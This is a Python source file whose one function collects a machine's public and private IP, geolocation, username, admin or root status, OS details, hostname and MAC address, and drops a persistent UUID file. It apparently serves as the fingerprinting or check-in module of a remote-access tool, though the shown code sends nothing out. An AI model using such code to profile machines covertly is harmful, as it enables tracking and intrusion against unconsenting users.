import socket
import requests
import os
import platform
import getpass
import geocoder
import subprocess
from uuid import getnode as get_mac
import uuid
import os

def run(url):
    def get_uuid():
        if platform.system() == "Windows":
            if os.path.exists("C:\\ProgramData\\uuid.txt"):
                with open("C:\\ProgramData\\uuid.txt", "r") as f:
                    return f.read().strip()
            else:
                uuid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
                with open("C:\\ProgramData\\uuid.txt", "w") as f:
                    f.write(uuid_value)
                return uuid_value
                
        if platform.system() == "Linux":
            if os.path.exists("./uuid.txt"):
                with open("./uuid.txt", "r") as f:
                    return f.read().strip()
            else:
                uuid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
                with open("./uuid.txt", "w") as f:
                    f.write(uuid_value)
                return uuid_value
    
    def get_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        try:
            s.connect(("10.254.254.254", 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = "127.0.0.1"
        finally:
            s.close()
        return IP
    
    def is_admin():
        system = platform.system()
    
        try:
            if system == "Windows":
                # Windows: Check if the user is an admin
                result = subprocess.run("net session",
                                        shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                return result.returncode == 0
    
            elif system == "Linux" or system == "Darwin" or system == "FreeBSD" or system == "OpenBSD":
                # Unix-like systems: Check if the user is root
                return os.geteuid() == 0
    
            elif system == "SunOS":  # Solaris
                # Solaris: Check if the user is root
                return os.geteuid() == 0
    
            elif system == "Android":
                # Android: Check if the script is running as root
                # Android-specific method to check for root access
                result = subprocess.run("su -c 'id'",
                                        shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                return 'uid=0(root)' in result.stdout.decode()
    
            else:
                return False
    
        except Exception as e:
            print(f"Error checking admin privileges: {e}")
            return False
    
    
    # Get public IP address
    try:
        public_ip = requests.get('https://api.ipify.org').text
    except:
        public_ip = 'Unknown'
    
    # Get geolocation
    try:
        geo = geocoder.ip('me')
        print(geo)
        geolocation = {
            'latitude': geo.latlng[0],
            'longitude': geo.latlng[1],
            'address': geo.address
        }
    except:
        geolocation = {
            'latitude': 'Unknown',
            'longitude': 'Unknown',
            'address': 'Unknown'
        }
    
    # Get username
    username = getpass.getuser()
    
    # Get platform information
    platform_info = platform.uname()
    
    # Get OS version
    os_version = platform.platform()
    
    hostname = platform.node()
    
    mac = get_mac()
    
    data = {
        'public_ip': public_ip,
        'private_ip': get_ip(),
        'geolocation': geolocation,
        'username': username,
        'permissions': is_admin(),
        'platform': platform_info,
        'os_version': os_version,
        'hostname': hostname,
        'mac_address': mac,
        'uuid': get_uuid(),
        'url': url,
    
    }
    
    return data
